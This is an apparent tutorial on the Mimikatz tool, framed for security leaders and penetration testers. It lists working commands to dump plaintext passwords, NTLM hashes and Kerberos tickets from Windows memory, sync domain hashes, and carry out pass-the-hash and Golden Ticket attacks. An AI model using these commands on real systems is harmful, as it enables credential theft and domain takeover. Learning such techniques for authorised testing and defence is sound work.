# Introduction to Mimikatz

Mimikatz is a sophisticated and versatile tool widely recognized in the cybersecurity community for its ability to extract plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory on Windows systems. Originally developed by Benjamin Delpy, it has become a crucial asset in both offensive and defensive security operations. For a CISO, understanding Mimikatz is essential due to its capability to highlight potential vulnerabilities within an organization's security posture, particularly in Active Directory environments. By leveraging Mimikatz, security teams can test the resilience of their systems against common credential theft techniques and ensure that protective measures are effectively mitigating such risks.

The primary reason to utilize Mimikatz within an organization is to proactively identify and address weaknesses that could be exploited by malicious actors. This tool enables penetration testers to simulate real-world attack scenarios, such as Pass-the-Hash and Golden Ticket attacks, providing invaluable insights into how an adversary might move laterally within a network. Additionally, Mimikatz can aid in forensic investigations by extracting credentials and tickets to understand the extent of a breach. This proactive approach allows organizations to strengthen their defenses, implement necessary patches, and improve overall security policies.

However, the powerful capabilities of Mimikatz come with significant risks, and it should be used with caution. Given its potential to extract sensitive information, misuse of Mimikatz can lead to unauthorized access and data breaches. Therefore, its use should be strictly controlled and limited to authorized personnel within a secure and monitored environment. Regular auditing and stringent access controls are crucial to prevent abuse. Moreover, incorporating defensive measures, such as enforcing strong authentication protocols, implementing endpoint detection and response (EDR) solutions, and conducting regular security awareness training, can mitigate the risks associated with the use of such a potent tool.

## Prerequisites

1. A Windows machine or virtual machine where you have administrative privileges.
2. Basic understanding of Windows security mechanisms.
3. An understanding of Active Directory (optional but beneficial).

### Step-by-Step Guide

#### Step 1: Downloading and Setting Up Mimikatz

1. **Download Mimikatz:**
   Visit the official [GitHub repository](https://github.com/gentilkiwi/mimikatz) and download the latest release.

   ```bash
   git clone https://github.com/gentilkiwi/mimikatz.git
   ```

2. **Compile Mimikatz:**
   If you downloaded the source code, compile it using Visual Studio.

   Alternatively, you can download precompiled binaries from the `release` section of the repository.

3. **Running Mimikatz:**
   Open an elevated Command Prompt (Run as Administrator) and navigate to the Mimikatz directory.

   ```bash
   cd path\to\mimikatz\x64
   mimikatz.exe
   ```

#### Step 2: Basic Commands

1. **Check Privileges:**
   Ensure Mimikatz is running with the necessary privileges.

   ```text
   privilege::debug
   ```

   The output should indicate success.

2. **Obtaining a List of Available Modules:**
   List all the modules available in Mimikatz.

   ```text
   mimikatz
   ```

#### Step 3: Extracting Passwords from Memory

1. **Extract Plaintext Passwords:**
   Use the `sekurlsa::logonpasswords` command to extract plaintext passwords from memory.

   ```text
   sekurlsa::logonpasswords
   ```

   This will display user credentials including NTLM hashes, Kerberos tickets, and plaintext passwords if available.

#### Step 4: Dumping Hashes

1. **Dump NTLM Hashes:**
   To dump NTLM hashes from the Security Account Manager (SAM) database, use the following commands:

   ```text
   token::elevate
   lsadump::sam
   ```

2. **Dumping Domain Hashes:**
   If the target is a domain controller, use the following command to dump domain hashes.

   ```text
   lsadump::dcsync /user:domain\username
   ```

   Replace `domain\username` with a valid domain user.

#### Step 5: Extracting Kerberos Tickets

1. **Dumping Tickets:**
   Extract all Kerberos tickets from memory.

   ```text
   sekurlsa::tickets
   ```

2. **Exporting Tickets:**
   Export the Kerberos tickets to `.kirbi` files.

   ```text
   sekurlsa::tickets /export
   ```

#### Step 6: Pass-the-Hash (PTH) Attack

1. **Using NTLM Hashes for Authentication:**
   Perform a Pass-the-Hash attack using NTLM hashes.

   ```text
   sekurlsa::pth /user:username /domain:domain /ntlm:hash
   ```

   Replace `username`, `domain`, and `hash` with the appropriate values.

#### Step 7: Golden Ticket Attack

1. **Creating a Golden Ticket:**
   Generate a Golden Ticket using the extracted NTLM hash of a domain administrator.

   ```text
   kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:hash /id:500
   ```

   Replace `domain.com`, `S-1-5-21-...`, and `hash` with the appropriate values.

2. **Injecting the Ticket:**
   Inject the Golden Ticket into the current session.

   ```text
   kerberos::ptt ticket.kirbi
   ```

### Conclusion

Mimikatz is a powerful tool that can be used to demonstrate and test the effectiveness of security mechanisms. It's essential to use it responsibly and ethically. Understanding and practicing these commands can significantly enhance your cybersecurity skills.
